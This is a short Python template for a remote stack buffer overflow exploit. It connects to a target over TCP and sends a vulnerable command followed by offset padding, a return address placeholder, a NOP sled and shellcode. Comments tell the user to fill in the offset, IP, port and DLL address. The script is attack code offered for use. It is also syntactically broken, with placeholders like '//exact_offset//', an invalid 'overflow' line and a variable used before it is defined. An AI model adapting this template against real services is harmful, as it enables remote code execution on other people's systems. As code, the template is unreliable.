#!/usr/bin/python3
#change exact_offset as your 
#change ipaddress and port as your
#change vulnerable_statement 
#change your_vulnerable_dll_in_assembly
 
import sys, socket 
from time import sleep

overflow = ("b"payload )

shellcode = b"A" * //exact_offset// + b"your_vulnerable_dll_in_assembly" + b"\x90" * 16 + overflow 

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("//ipaddress//",port))
    
    payload = "vulnerable_statement /.:/" + shellcode
    
    s.send((payload.encode()))
    s.close()
    
except:
    print ("Erorr connecting to server")
    sys.exit()